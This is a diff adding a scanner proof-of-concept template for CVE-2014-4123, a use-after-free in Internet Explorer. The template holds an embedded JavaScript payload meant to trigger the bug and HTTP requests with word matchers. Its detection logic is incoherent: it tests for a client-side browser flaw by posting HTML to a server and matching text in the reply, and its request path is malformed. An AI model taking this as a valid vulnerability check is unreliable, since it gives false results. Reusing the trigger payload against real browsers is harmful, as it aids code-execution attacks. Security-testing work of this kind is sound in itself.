@@ -1,0 +1,62 @@
+[info]
+author = "ave"
+description = "检测 Microsoft Internet Explorer CDisplayPointer 使用后释放漏洞 (CVE-2014-4123)，该漏洞允许攻击者在 IE 进程上下文中执行任意代码并提升至系统权限"
+id = "POC-AVE-2014-0309"
+name = "CVE-2014-4123 PoC"
+severity = "high"
+tags = ["ave-2014-0309"]
+vuln_id = [
+    "CVE-2014-4123",
+    "AVE-2014-0309",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "CVE-2014-4123",
+    "CDisplayPointer",
+    "use-after-free",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/trigger.html"
+protocol = "http"
+
+[poc.requests.body]
+content = "<html><body><script>try{document.body.contentEditable='true';var a=document.createElement('select');a.add(new Option());a.select();document.execCommand('selectAll');document.execCommand('insertOrderedList');var b=document.createElement('select');b.add(new Option());b.select();document.execCommand('insertOrderedList');document.write('triggered');}catch(e){document.write('error:'+e.message);}</script></body></html>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["triggered"]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["error:"]
